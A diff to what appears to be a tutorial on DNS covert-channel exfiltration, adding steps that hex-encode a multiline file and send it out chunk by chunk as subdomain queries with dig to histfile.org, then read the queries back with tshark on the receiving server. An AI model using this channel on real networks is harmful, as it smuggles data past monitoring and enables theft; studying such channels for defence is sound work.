@@ -69,11 +69,27 @@ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
 my secret message
 ```
 
+Now we do the same for a multiline text line. First we make the file:
+
+```bash
+echo -e "first line\nsecond line\nthird line" > secret.txt
+```
+
+Then
+
+```bash
+xxd -p secret.txt > secret.hex
+```
+
+Now we transmit secret.hex
+
 ```bash
 for b in $(cat secret.hex); do
   dig @histfile.org $b.covert.histfile.org
 done
 ```
+
+On the DNS server we cease the packet capturing and examine the captured packets
 
 ```bash
 tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
